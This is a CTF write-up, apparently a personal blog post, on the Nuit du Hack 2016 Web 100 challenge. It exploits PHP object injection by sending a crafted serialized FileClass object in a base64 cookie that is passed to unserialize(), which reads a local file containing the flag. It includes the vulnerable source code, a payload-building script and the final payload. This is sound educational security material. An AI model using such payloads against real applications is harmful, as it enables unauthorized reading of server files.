---
author: AnirudhAnand
layout: post
title: PHP object Injection via Cookie unserialize() - Nuit du hack CTF Web 100 writeup
categories:
- ctf
summary: Reading local files with PHP object Injection via Cookie unserialize() (Nuit du Hack 2016 web 10 writeup)
---

After a small break, I decided to participate in CTFs again and I am extremely happy about it. Nuit du CTF 2016 was a good one with couple of nice challenges ! Lets start with Web 100.

We are greeted with a sign up page where we can input a username and age. Then it took us onto a login page where we can enter the username and it logs us in. All the input fields are clean (no injections of any type was possible). But there was an interesting cookie named `cook` with a value `Tzo0OiJVc2VyIjoyOntzOjM6ImFnZSI7aToxMDtzOjQ6Im5hbWUiO3M6MzoibG9sIjt9` which looked really suspicious ! Base64 decoding the value gives the result `O:4:"User":2:{s:3:"age";i:10;s:4:"name";s:3:"lol";}`. That looks pretty much like serialized data. So probably to check the requests, they will be unserializing the cookies which could be vulnerable.

But in order for a successful attack, we need to get the class name so that we can use it to construct a proper payload. So I started digging if there is a way we can get the source code and it took sometime to find out there was a **/git/** directory. Cloning the git and resetting to the HEAD (`git reset --hard HEAD`) I got the files needed. It contains 3 major files named **userclass.php**, **fileclasse.php** and **ufhkistgfj.php**. The latter file contains the flag (in the server) which we should read. The fileclasse.php looks very interesting:

{%highlight php lineos %}
<?php
class FileClass
{

	public $filename = 'error.log';

	public function __toString()
	{
		return file_get_contents($this->filename);
	}
}
?>
{%endhighlight%}

So essentially it reads the files for us which is exactly what we want. Lets construct the serialized data:

{%highlight php lineos %}
<?php

require("./fileclasse.php");
$foo = new User();

file_put_contents("./serialized.txt", serialize($foo));

?>
{%endhighlight%}

Now the contents inside the file **serialized.txt** will look like this: `O:9:"FileClass":1:{s:8:"filename";s:9:"error.log";}`. We want to read the file named `ufhkistgfj.php`. So lets modify the payload a bit so that it can read ufhkistgfj.php which looks like this: `O:9:"FileClass":1:{s:8:"filename";s:14:"ufhkistgfj.php";}`. Now lets base64 encode it and sent it through cookies. We can get the flag in the response !!

For those who have no idea about **unserialize()** vulnerabilities, read on:

## (de)serialize():

serialize() basically converts an object into a string. So you can guess what unserialize does (it converts back serialized data into objects). When user controlled data passes through unserialize() without sanitization, it can lead to various vulnerabilities from reading local files to remote code execution. For a successful exploitation, 2 conditions has to be met:

1. All classes used for the attack should be declared and imported properly.
2. The application must have a class which implements a PHP magic method (\__wakeup(), \__sleep(), __toString() etc..)

The above conditions are satisfied in our cases (The class we need is `FileClass` which is already defnined and it contains a magic function \__toString). Let us take the above example and try to understand (reading arbitrary files).There is a user class called "Users" defined in userclass.php:

{%highlight php lineos %}
<?php
class User
{
	// Class data

	public  $age = 0;
	public  $name = '';

	// Allow object to be used as a String

	public function __toString()
	{
		return 'Hello ' . $this->name . ' you have ' . $this->age . ' years old. <br />';
	}
}

?>
{%endhighlight%}

This class is imported to **index.php** and using the incoming data from the user, it creates a serialized cookie string:

{%highlight php lineos %}
<?php
$form2=false;
    if (isset($_POST["name"]) && isset($_POST["age"]) && !empty($_POST['name']) && !empty($_POST['age'])) {
    	$form = false;
    	$name=$_POST['name'];
    	$age=$_POST['age'];
    	$a = new User();
    	$a->age = $age;
    	$a->name = $name;
    	$form2=true;
setcookie("cook", base64_encode(serialize($a)), time()+3600, "/","", 0);
            } else {
                $form = true;
                $message = 'Put your name & age please.';
            }
{%endhighlight%}

So basically a new object named `a` is created using which they set the age and name attributes from the incoming user input data. Then the variable is serialized() and is set as cookie with 1 hour expiry. The serialized data looks like this:


`O:4:"User":2:{s:3:"age";i:10;s:4:"name";s:3:"lol";}`

`O:<class_name_length>:"<class_name>":<number_of_properties>:{<properties>};`


Now lets look into **result.php** where `unserialize($_COOKIE['cook'])` happens:

{%highlight php lineos %}
<?php
include('./userclass.php');
include('./fileclasse.php');
session_start();
if (isset($_COOKIE["cook"]) && !empty($_COOKIE["cook"])){	 
     	   $obj = unserialize(base64_decode($_COOKIE['cook']));

	   ob_start();
	   echo $obj;

           $ff = $obj->name;
     	}
     	if(isset($_POST["name_2"]) && !empty($_POST['name_2']) && $ff==$_POST['name_2'])
     	{   
?>
{%endhighlight%}

You can see that the cookie gets unserialize() and saved into a variable (now object) called `$obj`. It is also getting reflected into the output which means if we can get it to read files, it will  automatically echo us the file contents. Here it is important to note that they are also importing `fileclasse.php` which basically reads **error.log**. But since we can send serialized data via cookies, we will change the cookie data to read files using the `fileclasse.php`. So lets write a simple script which serializes the data for us using fileclasse.php:

{%highlight php lineos %}
<?php
require("./fileclasse.php");
$foo = new FileClass();
file_put_contents("./serialized.txt", serialize($foo));
?>
{%endhighlight%}

Running the above script will return us the string `O:9:"FileClass":1:{s:8:"filename";s:9:"error.log";}` but we want to read `ufhkistgfj.php` and not error.log. So simply modify the serialized data to the filename we want and make sure you change the length accordingly. So final payload becomes: `O:9:"FileClass":1:{s:8:"filename";s:14:"ufhkistgfj.php";}`. Lets Base64 encode it and place it as the cookie value. Refresh the page (Best to use burpsuite to see the response) and in the response you can get the contents of the file.

```
HTTP/1.1 302 Found
Date: Sun, 03 Apr 2016 08:18:57 GMT
Server: Apache/2.4.10 (Debian) PHP/5.6.19
X-Powered-By: PHP/5.6.19
Expires: Tue, 01 Jan 1971 02:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
location: index.php
Content-Length: 166
Content-Type: text/html; charset=UTF-8

<?php

  if($_COOKIE["cook"]==Tzo5OiJGaWxlQ2xhc3MiOjE6e3M6ODoiZmlsZW5hbWUiO3M6MTQ6InVmaGtpc3RnZmoucGhwIjt9){
 echo "NDH[bsnae6PcNyrWZ82Q8v6pfJ6C6HG433L6]";
 }
?>

```
You can see the file content in the response !

## References:
These are some of the awesome references you can use to learn more about PHP object Injection and unserialize():

1. [Practical PHP Object Injection ](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)
2. [Remote code execution via PHP [Unserialize]](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)
